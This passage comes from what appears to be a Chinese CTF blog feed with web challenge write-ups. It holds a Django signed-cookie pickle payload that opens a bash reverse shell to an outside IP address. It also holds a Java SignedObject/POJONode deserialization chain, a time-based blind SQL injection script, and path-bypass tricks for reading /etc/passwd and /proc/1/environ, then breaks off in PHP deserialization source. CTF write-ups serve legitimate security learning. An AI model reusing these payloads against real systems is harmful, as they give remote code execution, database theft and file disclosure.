class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure><p>这里的话是先进行登录  然后将<code>cookie</code>修改为我们构造的  然后访问<code>auth</code>路由就行了</p><p>但是我这里没弹成功  不知道是<code>payload</code>的问题还是我的操作问题</p><h2 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h2><p>这道题考察的是http2</p><p><strong>确实符合题目说的一种很新的方式</strong></p><p>这里的话是参考github上这个出的题目  几乎一模一样</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">http2</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&amp;mid=2247484933&amp;idx=1&amp;sn=60ae6e59096e22a2b60bb7ba4e80ce04&amp;chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&amp;mpshare=1&amp;scene=23&amp;srcid=072376b235QJm9tNCYWMZFQU&amp;sharer_sharetime=1690091289890&amp;sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">这个wp中也写了这个题目的wp</a></p><p>好像这个题目的地址关了  所以我就没做了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EzFlask&quot;&gt;&lt;a href=&quot;#EzFlask&quot; class=&quot;headerlink&quot; title=&quot;EzFlask&quot;&gt;&lt;/a&gt;EzFlask&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1876/#toc_obje</summary>
      
    
    
    
    
    <category term="DASCTF 2023 &amp; 0X401-Web" scheme="https://ke1nys.github.io/tags/DASCTF-2023-0X401-Web/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2023-Web</title>
    <link href="https://ke1nys.github.io/posts/7d1902a5.html"/>
    <id>https://ke1nys.github.io/posts/7d1902a5.html</id>
    <published>2023-07-21T08:52:15.000Z</published>
    <updated>2023-07-29T08:13:42.304Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p><strong>审计代码得出一个思路</strong></p><p>就是在反序列化的时候会将得到的内容写入到  <code>/tmp/file</code>下</p><p>然后在<code>/file</code>下就可以读取到内容</p><p><img src="../images/image-20230721165726299.png" alt="image-20230721165726299"></p><p>题目把这个有反序列化入口的类给ban了  </p><p>这里的话就可以容易想到二次反序列化绕过</p><p>刚好就可以想到<code>SignedObject</code>这个jdk自带的类  </p><p>查看依赖发现没有什么特别的类可以用   于是就想到之前阿里云ctf里用过的<code>JackSon</code>这个类</p><p>刚好可以触发getter  </p><p>于是得出利用了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException</span><br><span class="line">POJONode</span><br><span class="line">SignedObject</span><br></pre></td></tr></table></figure><p>所以最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.util.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;File:///F14gIsHereY0UGOTIT&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        handler.visiter = urlVisiter;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(handler,privateKey,signingEngine);</span><br><span class="line">        <span class="comment">//这个SignedObject传进来就是要反序列化的类</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="comment">//这里就是使用POJONode这个可以触发任意getter的方法 ----&gt;  来触发这个signedObject里的getObject()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>通过这道题的话学到了一些新东西</strong></p><p><img src="../images/image-20230724101125766.png" alt="image-20230724101125766"></p><p>这道题的话其实也可以利用<code>netdoc</code>这个协议来读取文件内容   </p><p>(可以当作<code>file</code>协议的替代品)</p><h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>这里的话先是fuzz了一下  发现<strong>sleep benchmark rpad if count</strong> 都过滤了</p><p>然后在页面尝试测试了一下   猜测是个<strong>sql盲注</strong></p><p>(所以就猜测是用<strong>笛卡尔乘积</strong>)    </p><p>这里的话却不能使用这个常规的  (因为<code>count</code>和<code>if</code>都被ban了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)a,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)b,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns limit <span class="number">1</span>,<span class="number">7</span>)c) limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>当时因为懒 没深究这个  看别的题去了  导致没做出来。。。。。。。</p><p><strong>直接问gpt</strong></p><p><img src="../images/image-20230724104909369.png" alt="image-20230724104909369"></p><p><img src="../images/image-20230724105015874.png" alt="image-20230724105015874"></p><p><strong>直接让gpt来帮我们在原来的基础上进行修改</strong></p><p><img src="../images/image-20230724105451643.png" alt="image-20230724105451643"> </p><p><img src="../images/image-20230724105521195.png" alt="image-20230724105521195"></p><p>可以成功进行延时</p><p><strong>最终的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            burp0_url = <span class="string">&quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot;</span> \</span><br><span class="line">                        <span class="string">&quot;substr(group_concat(table_name),&#123;&#125;,1)) from information_schema.tables where table_schema=database()))=&#123;&#125; then (select sum(1) FROM &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.views D) else 1 end-- -&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">                <span class="comment">#Flllag</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&#x27;Flllag&#x27;))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line">                <span class="comment">#Flagg</span></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(Flagg),&#123;&#125;,1)) from Flllag))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line"></span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            r = requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            <span class="comment"># print(j,r.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;kfrL9n0upSAOMvY8hcO8uLdYMo9mZjHY&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230724110506033.png" alt="image-20230724110506033"></p><p>这里解释一下这个<code>case when condition then result</code>  的意思</p><p>就是当<strong>查询内容</strong>满足这个<code>condition</code>的时候就会返回<code>result</code> </p><p><strong>上述代码的意思就是说匹配到的时候就会延时</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>其实就是考察的是<strong>时间盲注</strong>  但是只是需要替换一些函数</li></ul><h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p>这道题预期解其实是挺复杂的  但是这题存在非预期  (<strong>原因是出题人在运行完sh文件后没把该文件删除  导致出现了非预期)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目提示了 </span><br><span class="line">访问/hinder</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230725111811018.png" alt="image-20230725111811018"></p><p>没访问之前是可以看到这个网站的服务器是<code>java</code>的    (<strong>是个挺重要的信息</strong>)</p><p><img src="../images/image-20230725112023678.png" alt="image-20230725112023678"></p><p>这里话是有两个绕过方法</p><ul><li>一个是url编码  (<strong>因为这里是前端校验</strong>)</li><li>另一个是使用    <code>/;/hinder</code></li><li><code>/anything/../hinder/</code> <strong>绕过路径 (这样也行)</strong></li></ul><p><img src="../images/image-20230725112140700.png" alt="image-20230725112140700"></p><p>这里的话讲一下这个  <code>/;/hinder</code>  绕过的原理</p><p><img src="../images/image-20230725112306230.png" alt="image-20230725112306230"></p><p><img src="../images/image-20230725112342291.png" alt="image-20230725112342291"></p><p>其实这里的话就是实现任意文件读取了   (<strong>看到这个<code>action</code>的时候其实可以想到这个<code>struct2</code></strong>)</p><p>尝试读取一下<code>/etc/passwd</code></p><p><img src="../images/image-20230725113456496.png" alt="image-20230725113456496"></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a><strong>非预期解</strong></h3><p>尝试读取出题人常用的docker启动脚本   <strong>例如 <code>/run.sh  /start.sh</code></strong></p><p><img src="../images/1689930726240-f021d0b4-1312-46c6-8638-1a3398dd542f.png" alt="img"></p><p>然后读取该文件就行了 </p><p><img src="../images/1689930751274-96d92ed6-3259-4bcd-bdda-dc7be9aea343.png" alt="img"></p><p><strong>看到这些非预期解以后   以后读取文件的话可以尝试读取这两个地方的东西了</strong></p><ul><li><code>/proc/1/environ</code></li><li><code>/proc/1/cmdline</code></li><li><code>/run.sh  /start.sh 等等之类的docker启动常用脚本</code></li></ul><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://www.yuque.com/dat0u/ctf/vl4hurp3yvqqsckz#BPCx1">巅峰极客2023 hinder</a></p><p>这个是使用的是<code>struct2</code>的漏洞来解的题</p><p>这里还没有一个完整的wp来看   所以先不写</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><strong>unserialize</strong></h2><p><strong>启动脚本</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/dfjk2023_unserialize</span></span><br></pre></td></tr></table></figure><p>访问  <code>/www.zip</code>  得到源码</p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这里的话大佬应该能猜到是反序列化逃逸</strong>)      反正我没猜到…………</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>my.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 